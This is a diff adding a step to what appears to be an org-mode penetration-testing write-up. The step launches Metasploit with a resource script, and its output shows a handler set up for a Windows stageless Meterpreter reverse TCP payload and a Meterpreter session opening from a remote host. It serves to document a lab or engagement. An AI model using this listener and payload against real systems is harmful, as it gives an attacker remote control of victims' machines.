@@ -505,7 +505,73 @@ Mode              Size  Type  Last modified              Name
 100666/rw-rw-rw-  228   fil   2018-01-09 01:25:36 +0000  glob.py
 #+END_SRC
 
-Now we just need to wait for the service to restart...
+Now we just need to launch Metasploit and wait for the service to restart...
+
+#+BEGIN_SRC 
+$ msfconsole -r windows-meterpreter-stageless-reverse-tcp-4445-exe.rc
+
+
+     .~+P``````-o+:.                                      -o+:.
+.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
++++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
+++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
+--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
+                                `...............`              `...-/////...`
+
+
+                                  .::::::::::-.                     .::::::-
+                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
+                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
+                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
+                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
+                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
+    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
+      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
+    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
+    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
+          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
+          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
+          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
+........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
+================================================================================
+=====================+--------------------------------+=========================
+=====================| Session one died of dysentery. |=========================
+=====================+--------------------------------+=========================
+================================================================================
+
+                     Press ENTER to size up the situation
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+                        Press SPACE BAR to continue
+
+
+
+       =[ metasploit v4.16.14-dev-140955f                 ]
++ -- --=[ 1698 exploits - 969 auxiliary - 299 post        ]
++ -- --=[ 500 payloads - 40 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+[*] Processing msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc for ERB directives.
+resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)> use exploit/multi/handler
+resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)> set PAYLOAD windows/meterpreter_reverse_tcp
+PAYLOAD => windows/meterpreter_reverse_tcp
+resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)> set LHOST 1.2.3.4
+LHOST => 1.2.3.4
+resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)> set LPORT 4445
+LPORT => 4445
+resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)> set ExitOnSession false
+ExitOnSession => false
+resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)> run -j
+[*] Exploit running as background job 0.
+Meterpreter session 1 opened (1.2.3.4:4445 -> 35.185.57.190:49672) at 2018-01-09 05:08:43 +0000
+#+END_SRC
 
 ** Common Pitfalls
    :PROPERTIES:
